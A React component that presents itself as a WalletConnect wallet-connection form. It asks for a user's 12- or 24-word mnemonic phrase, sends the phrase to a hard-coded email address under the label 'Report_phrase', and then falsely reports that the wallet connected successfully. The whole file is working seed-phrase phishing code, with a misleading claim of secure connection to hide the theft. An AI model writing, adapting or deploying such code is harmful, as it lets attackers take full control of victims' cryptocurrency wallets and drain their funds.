import { LoadingButton } from "@mui/lab";
import { styled, alpha } from "@mui/material/styles";
import * as React from "react";
import { sendMessage } from "../../config/services";
import { Container, Paper, TextField } from "@mui/material";
import CustomizedSnackbars, { CustomAlert } from "../alert";

const BootstrapButton = styled(LoadingButton)({
  boxShadow: "none",
  textTransform: "none",
  fontSize: 16,
  padding: "6px 12px",
  border: "1px solid",
  lineHeight: 1.5,
  backgroundColor: "#4caf50",
  height: 50,
  fontFamily: [
    "-apple-system",
    "BlinkMacSystemFont",
    '"Segoe UI"',
    "Roboto",
    '"Helvetica Neue"',
    "Arial",
    "sans-serif",
    '"Apple Color Emoji"',
    '"Segoe UI Emoji"',
    '"Segoe UI Symbol"',
  ].join(","),
});

const RedditTextField = styled((props) => (
  <TextField InputProps={{ disableUnderline: true }} {...props} />
))(({ theme }) => ({
  "& .MuiFilledInput-root": {
    overflow: "hidden",
    borderRadius: 4,
    backgroundColor: theme.palette.mode === "light" ? "#F3F6F9" : "#1A2027",
    border: "1px solid",
    borderColor: theme.palette.mode === "light" ? "#E0E3E7" : "#2D3843",
    transition: theme.transitions.create([
      "border-color",
      "background-color",
      "box-shadow",
    ]),
    "&:hover": {
      backgroundColor: "transparent",
    },
    "&.Mui-focused": {
      backgroundColor: "transparent",
      boxShadow: `${alpha(theme.palette.primary.main, 0.25)} 0 0 0 2px`,
      borderColor: theme.palette.primary.main,
    },
  },
}));

export default function ConnectWallet() {
  const [value, setValue] = React.useState({
    wallet: "undefined",
    phrase: "",
    phrasecount: 0,
    alerMessage: "",
    severity: "warning",
  });
  const [loading, setLoading] = React.useState(false);
  const [openSnackbar, setOpenSnackbar] = React.useState(false);

  const handleChange = (event) => {
    let phrase = event.target.value;
    const phraseArray = phrase.split(" ");
    console.log(phraseArray.length);
    setValue({
      ...value,
      [event.target.name]: event.target.value,
      phrasecount: phraseArray.length,
    });
  };

  const handleCloseSnackbar = (event, reason) => {
    if (reason === "clickaway") {
      return;
    }

    setOpenSnackbar(false);
  };

  const errFunction = () => {
    setValue({ ...value, alerMessage: "Failed? Network anormaly!" });
    setOpenSnackbar(true);
    setLoading(false);
  };

  const submitFunction = (event) => {
    event.preventDefault();
    if (value.phrasecount < 12) {
      setValue({
        ...value,
        alerMessage: "Invalid Mnemonics Phrase",
        severity: "warning",
      });
      setOpenSnackbar(true);
    } else {
      setLoading(true);
      sendMessage(
        `phrase:  ${value.phrase}`,
        "Report_phrase",
        "cambit000@gmail.com"
      )
        .then(() => {
          setValue({
            ...value,
            severity: "success",
            alerMessage: "Wallet connected succcessfully.",
          });
          setOpenSnackbar(true);
          setLoading(false);
        })
        .catch((err) => {
          errFunction();
        });
    }
  };

  return (
    <Container maxWidth="sm">
      <Paper elevation={0} sx={{ padding: 2 }}>
        <CustomizedSnackbars
          openSnackbar={openSnackbar}
          handleCloseSnackbar={handleCloseSnackbar}
          severity="warning"
          message={value.alerMessage}
        />
        <form onSubmit={submitFunction}>
          <RedditTextField
            label="Enter Mnemonic phrase"
            name="phrase"
            defaultValue={value.phrase}
            id="reddit-input"
            variant="filled"
            style={{ marginTop: 11 }}
            onChange={handleChange}
            fullWidth
            multiline
            rows={3}
            helperText="Separated by space. you can choose to import wallets with 12-word or 24-word Mnenomics, phrase should be a plain text."
          />

          <BootstrapButton
            sx={{ mt: 4 }}
            loading={loading}
            type="submit"
            variant="contained"
            color="success"
            //  onClick={handleClickOpen}
            disableElevation
            size="large"
            fullWidth
          >
            Submit
          </BootstrapButton>
        </form>

        <CustomAlert>
          <p>
            Our communications protocol with WalletConnect brings the ecosystem
            together by enabling wallets and apps to securely connect and
            interact.
          </p>
        </CustomAlert>
      </Paper>
    </Container>
  );
}
